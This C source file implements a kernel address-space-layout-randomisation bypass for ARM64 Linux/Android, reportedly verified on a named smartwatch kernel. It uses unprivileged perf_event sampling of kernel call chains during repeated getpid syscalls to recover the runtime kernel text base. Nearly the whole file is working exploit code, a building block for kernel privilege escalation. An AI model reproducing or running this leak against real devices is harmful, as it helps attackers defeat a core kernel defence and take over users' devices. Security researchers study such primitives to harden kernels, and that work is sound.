/* kaaslr.c — runtime kernel base via perf (read-only).
 * Verified on OnePlus Watch 3 (5.15.185, perf_event_paranoid=-1).
 *
 * Idea: every syscall from EL0 has an el0t_64_sync frame at the bottom of the
 * kernel stack, which lies at offset < 0x12000 from _text. We collect call
 * chains (PERF_SAMPLE_CALLCHAIN), take the deepest frame, keep those with
 * low 21 bits (< 0x20000 — entry region), and return the MODE of
 * round_down(frame, 2MB). That is the runtime _text.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <linux/perf_event.h>
#include "kaaslr.h"

#ifndef __NR_perf_event_open
#define __NR_perf_event_open 241
#endif

#define RP 16
#define MAXR 8192
#define KBASE_ALIGN 0x200000UL

static uint64_t roots[MAXR];
static int nroots;

static void drain_roots(void *base, size_t pg, size_t ds,
                        struct perf_event_mmap_page *meta)
{
    char *data = (char *)base + pg;
    __sync_synchronize();
    uint64_t head = meta->data_head;
    while (meta->data_tail < head) {
        struct perf_event_header *h = (void *)(data + (meta->data_tail % ds));
        if (h->size < sizeof(*h)) { meta->data_tail = head; break; }
        if (h->type == PERF_RECORD_SAMPLE) {
            char *q = (char *)h + sizeof(*h);
            uint64_t ip; memcpy(&ip, q, 8); q += 8;   /* leaf (unused) */
            uint64_t nr; memcpy(&nr, q, 8); q += 8;
            if (nr > 64) nr = 64;
            uint64_t root = 0;
            for (uint64_t k = 0; k < nr; k++) {
                uint64_t c; memcpy(&c, q, 8); q += 8;
                if (c >= 0xffff000000000000UL) root = c;   /* last sensible */
            }
            /* filter: the entry frame is at the start of a 2MB block */
            if (root && (root & (KBASE_ALIGN - 1)) < 0x20000UL && nroots < MAXR)
                roots[nroots++] = root;
        }
        meta->data_tail += h->size;
    }
}

uint64_t kaaslr_text_base(void)
{
    struct perf_event_attr a;
    memset(&a, 0, sizeof(a));
    a.type = PERF_TYPE_HARDWARE;
    a.size = sizeof(a);
    a.config = PERF_COUNT_HW_INSTRUCTIONS;
    a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_CALLCHAIN;
    a.sample_period = 150000;
    a.disabled = 1;
    a.exclude_kernel = 0;
    a.exclude_hv = 1;
    a.wakeup_events = 1;

    int fd = (int)syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
    if (fd < 0) return 0;

    size_t pg = sysconf(_SC_PAGESIZE), ds = RP * pg, ms = ds + pg;
    void *base = mmap(NULL, ms, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (base == MAP_FAILED) { close(fd); return 0; }
    struct perf_event_mmap_page *meta = base;

    nroots = 0;
    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    for (long i = 0; i < 6000000 && nroots < MAXR; i++) {
        syscall(172);                         /* getpid — guarantees EL0 entries */
        if ((i & 0x3fff) == 0) drain_roots(base, pg, ds, meta);
    }
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
    munmap(base, ms);
    close(fd);

    if (nroots == 0) return 0;

    /* MODE after round_down(root, 2MB) */
    uint64_t best = 0; int bestc = 0;
    for (int i = 0; i < nroots; i++) {
        uint64_t b = roots[i] & ~(KBASE_ALIGN - 1);
        int c = 0;
        for (int j = 0; j < nroots; j++)
            if ((roots[j] & ~(KBASE_ALIGN - 1)) == b) c++;
        if (c > bestc) { bestc = c; best = b; }
    }
    (void)bestc;
    return best;
}
